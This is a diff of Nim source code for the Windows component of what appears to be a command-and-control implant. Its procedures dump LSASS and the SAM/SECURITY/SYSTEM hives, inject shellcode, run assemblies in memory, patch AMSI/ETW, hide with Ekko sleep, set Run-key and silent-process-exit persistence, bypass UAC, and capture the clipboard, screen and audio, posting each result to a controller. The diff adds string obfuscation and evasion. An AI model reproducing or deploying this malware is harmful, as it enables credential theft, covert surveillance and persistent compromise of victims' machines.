@@ -1,6 +1,7 @@
 # Internal imports
 import ../config
 import ../common
+import utils/incl/cfg
 import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
 # Internal imports
 import std/[tables, nativesockets, json]
@@ -8,7 +9,9 @@ import winim/[lean, com]
 import wAuto/[registry]
 import system/[io]
 import httpclient
+import threadpool
 import nimprotect
+import strformat
 import strutils
 import osproc
 import crc32
@@ -29,12 +32,12 @@ proc dump_lsass(dump_method: string): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
-proc wrap_unhook_ntdll(): bool
-proc wrap_patch_func(command_name: string): bool
+proc wrap_patch_func(func_name: string): bool
+proc change_memsleep(technique: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
-proc msgbox(title: string, text: string): bool
+proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
 
 # Helpers
@@ -67,6 +70,10 @@ proc collect_data(): bool =
     except:
         os_version = could_not_retrieve
     try:
+        process = fmt"[{$getCurrentProcessId()}] {getAppFilename()}"
+    except:
+        process = could_not_retrieve
+    try:
         username = execute_encoded_powershell(protectString("WwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkALgBuAGEAbQBlAAoA"))
     except:
         username = could_not_retrieve
@@ -86,10 +93,6 @@ proc collect_data(): bool =
         ipv4_public = client.getContent(protectString("http://api.ipify.org"))
     except:
         ipv4_public = could_not_retrieve
-    try:
-        process = execute_encoded_powershell(protectString("JAB4ACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AUABJAEQAIAAkAHAAaQBkACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAG4AYQBtAGUAOwAgACIAJABwAGkAZAAgACQAeAAuAGUAeABlACIA"))
-    except:
-        process = could_not_retrieve
 
     var data = {
 
@@ -97,8 +100,8 @@ proc collect_data(): bool =
         protectString("OS Version"): os_version,
         protectString("Process"): process,
         protectString("Username"): username, 
-        protectString("Is Admin"): is_admin, 
-        protectString("Is Elevated"): is_elevated, 
+        protectString("Admin"): is_admin, 
+        protectString("Elevated"): is_elevated, 
         protectString("IPV4 Local"): ipv4_local, 
         protectString("IPV4 Public"): ipv4_public
     
@@ -148,8 +151,8 @@ proc checksec(): bool =
         is_success = false
     
     var data = {
-        "is_success": $is_success,
-        "products": products
+        protectString("is_success"): $is_success,
+        protectString("products"): products
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("checksec") , $data)
@@ -168,7 +171,7 @@ proc wrap_get_clipboard(): bool =
         is_success = false
     
     var data = {
-        "is_success": $is_success,
+        protectString("is_success"): $is_success,
         protectString("clipboard"): clipboard
     }.toOrderedTable()
     
@@ -188,7 +191,7 @@ proc wrap_get_screenshot(): bool =
         is_success = false
     
     var data = {
-        "is_success": $is_success,
+        protectString("is_success"): $is_success,
         protectString("screenshot_base64"): encode_64(screenshot_stream, is_bin=true)
     }.toOrderedTable()
     
@@ -200,11 +203,11 @@ proc wrap_get_screenshot(): bool =
 proc wrap_record_audio(record_time: int): bool = 
     var is_success: bool
     var file_content_base64: string
-    var wav_file = "r.w"
+    var wav_file = protectString("r.w")
 
     discard record_audio(wav_file, record_time)
 
-    sleep(3000)
+    sleep(2000)
 
     try:
         file_content_base64 = encode_64(readFile(wav_file), is_bin=true)
@@ -219,7 +222,7 @@ proc wrap_record_audio(record_time: int): bool =
         discard
     
     var data = {
-        "is_success": $is_success,
+        protectString("is_success"): $is_success,
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable
     is_success = post_data(client, protectString("audio") , $data)
@@ -232,27 +235,27 @@ proc dump_lsass(dump_method: string): bool =
     var file_content_base64: string
 
     case dump_method:
-        of "direct":
+        of protectString("direct"):
             discard dump_lsass_minidumpwritedump()
-        of "comsvcs":
+        of protectString("comsvcs"):
             discard execute_encoded_powershell(protectString("cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwB8ACAAcwBlAGwAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAGkAZAApACAAbAAuAGQAIABmAHUAbABsAA=="))
 
     sleep(3000)
 
     try:
-        file_content_base64 = encode_64(readFile("l.d"), is_bin=true)
+        file_content_base64 = encode_64(readFile(protectString("l.d")), is_bin=true)
         is_success = true
     except:
         file_content_base64 = could_not_retrieve
         is_success = false
 
     try:
-        removeFile("l.d")
+        removeFile(protectString("l.d"))
     except:
         discard
     
     var data = {
-        "is_success": $is_success,
+        protectString("is_success"): $is_success,
         protectString("file_content_base64"): file_content_base64
     }.toOrderedTable
     is_success = post_data(client, protectString("lsass") , $data)
@@ -265,9 +268,9 @@ proc dump_sam(): bool =
     var sam_base64: string
     var sec_base64: string
     var sys_base64: string
-    var sam_file = "s.am"
-    var sec_file = "s.ec"
-    var sys_file = "s.ys"
+    var sam_file = protectString("s.am")
+    var sec_file = protectString("s.ec")
+    var sys_file = protectString("s.ys")
 
     if execCmdEx(protectString("reg.exe save hklm\\sam ") & sam_file, options={poDaemon}).exitCode == 0 and 
     execCmdEx(protectString("reg.exe save hklm\\security ") & sec_file, options={poDaemon}).exitCode == 0 and 
@@ -297,7 +300,7 @@ proc dump_sam(): bool =
         discard
     
     var data = {
-        "is_success": $is_success,
+        protectString("is_success"): $is_success,
         protectString("sam_base64"): sam_base64,
         protectString("sec_base64"): sec_base64,
         protectString("sys_base64"): sys_base64
@@ -312,8 +315,8 @@ proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =
     var is_success = inject_shellcode(shellc_bytes, pid)
     
     var data = {
-        "is_success": $is_success,
-        "pid": $pid
+        protectString("pid"): $pid,
+        protectString("is_success"): $is_success,
     }.toOrderedTable
 
     is_success = post_data(client, protectString("shellc") , $data)
@@ -326,8 +329,8 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
     (is_success, output) = execute_assembly(assembly_base64, assembly_args)
     
     var data = {
-        "is_success": $is_success,
-        "output": output
+        protectString("is_success"): $is_success,
+        protectString("output"): output
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("assembly"), $data)
@@ -335,29 +338,39 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
     return is_success
 
 
-proc wrap_unhook_ntdll(): bool =
+proc wrap_patch_func(func_name: string): bool =
     
-    var is_success = unhook_ntdll()
-
+    var is_success = patch_func(func_name)
+    
     var data = {
-        "is_success": $is_success
+        protectString("is_success"): $is_success
     }.toOrderedTable()
     
-    is_success = post_data(client, protectString("unhook") , $data)
+    is_success = post_data(client, func_name , $data)
 
     return is_success
 
 
-proc wrap_patch_func(command_name: string): bool =
-    
-    var is_success = patch_func(command_name)
+proc change_memsleep(technique: string): bool =
+    var is_success: bool
+    if technique == protectString("none"): 
+        memsleep_technique = 0
+        is_success = true
+    elif technique == protectString("ekko"):
+        if isControlFlowGuardEnabled():
+            is_success = false
+        else:
+            is_success = true
+            memsleep_technique = 1
+    else:
+        is_success = false
     
     var data = {
-        "is_success": $is_success
+        protectString("technique"): technique,
+        protectString("is_success"): $is_success
     }.toOrderedTable()
     
-    is_success = post_data(client, command_name , $data)
-
+    is_success = post_data(client, protectString("memsleep") , $data)
     return is_success
 
 
@@ -366,16 +379,16 @@ proc set_run_key(key_name: string, cmd: string): bool =
     let run_path = protectString("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
     var added_path = ""
     
-    for hive in ["HKLM", "HKCU"]:
+    for hive in [protectString("HKLM"), protectString("HKCU")]:
         if regWrite(hive & run_path, key_name, cmd):
             is_success = true  
             added_path = hive & run_path & " -> " & key_name
             break
     
     var data = {
-        "is_success": $is_success,
-        "registry_path": added_path,
-        protectString("persistence_command"): cmd
+        protectString("registry_path"): added_path,
+        protectString("persistence_command"): cmd,
+        protectString("is_success"): $is_success
     }.toOrderedTable()
 
     is_success = post_data(client, protectString("persist-run"), $data)
@@ -392,9 +405,10 @@ proc set_spe(process_name: string, cmd: string): bool =
         is_success = true
     
     var data = {
-        "is_success": $is_success,
         protectString("triggering_process"): process_name,
-        protectString("persistence_command"): cmd
+        protectString("persistence_command"): cmd,
+        protectString("is_success"): $is_success
+
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("persist-spe"), $data)
@@ -424,9 +438,9 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
             is_success = true
 
     var data = {
-        "is_success": $is_success,
         protectString("elevated_command"): cmd,
-        "keep_or_die": keep_or_die
+        protectString("keep_or_die"): keep_or_die,
+        protectString("is_success"): $is_success
     }.toOrderedTable
     
     is_success_post = post_data(client, protectString("uac-") & bypass_method , $data)
@@ -441,23 +455,10 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
         return is_success_post
 
 
-proc msgbox(title: string, text: string): bool =
-    var is_success: bool
-    
-    try:
-        MessageBox(0, text, title, 0)
-        is_success = true
-    except:
-        is_success = false
-    
-    var data = {
-        "is_success": $is_success,
-        "msgbox_content": "[" & title & "] " & text
-        
-    }.toOrderedTable()
-    
-    is_success = post_data(client, "msgbox" , $data)
-    return is_success
+proc msgbox(title: string, text: string) {.gcsafe.} =
+    # spawn in a new thread
+    MessageBox(0, text, title, 0)
+
 
 
 proc speak(text: string): bool =
@@ -472,8 +473,8 @@ proc speak(text: string): bool =
         is_success = false
 
     var data = {
-        "is_success": $is_success,
-        "text": text
+        protectString("text"): text,
+        protectString("is_success"): $is_success
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("speak") , $data)
@@ -487,7 +488,8 @@ proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
     
     var data = {
         protectString("sleep_timeframe"): $call_home_timeframe,
-        protectString("sleep_jitter_percent"): $call_home_jitter_percent
+        protectString("sleep_jitter_percent"): $call_home_jitter_percent,
+        protectString("is_success"): $is_success
     }.toOrderedTable()
     
     is_success = post_data(client, protectString("sleep") , $data)
@@ -528,7 +530,7 @@ proc is_elevated(): string =
 proc windows_start*(): void =
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
-    if is_exe and (binary_path != agent_execution_path_windows):
+    if is_exe and reloc_on_exec_windows and (binary_path != agent_execution_path_windows):
         var agent_execution_dir = splitFile(agent_execution_path_windows)[0]
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_windows)
@@ -573,10 +575,10 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command["pid"].getInt())
         of protectString("assembly"):
             is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
-        of protectString("unhook"):
-            is_success = wrap_unhook_ntdll()
-        of protectString("amsi"), protectString("etw"):
-            is_success = wrap_patch_func(command[protectString("command_type")].getStr())
+        of protectString("patch"):
+            is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
+        of protectString("memsleep"):
+            is_success = change_memsleep(command[protectString("memsleep_technique")].getStr())
         of protectString("persist-run"):
             is_success = set_run_key(command["key_name"].getStr(), command[protectString("persist_command")].getStr())
         of protectString("persist-spe"):
@@ -584,7 +586,15 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("uac-bypass"):
             is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr(), command[protectString("keep_or_die")].getStr())
         of protectString("msgbox"):
-            is_success = msgbox(command["title"].getStr(), command["text"].getStr())
+            # spawn in a new thread
+            var title = command["title"].getStr()
+            var text = command["text"].getStr()
+            spawn msgbox(title, text)
+            var data = {
+                protectString("msgbox_content"): "[" & title & "] " & text,
+                protectString("status"): "spawned in a new thread"
+                }.toOrderedTable()
+            discard post_data(client, protectString("msgbox") , $data)
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("sleep"):
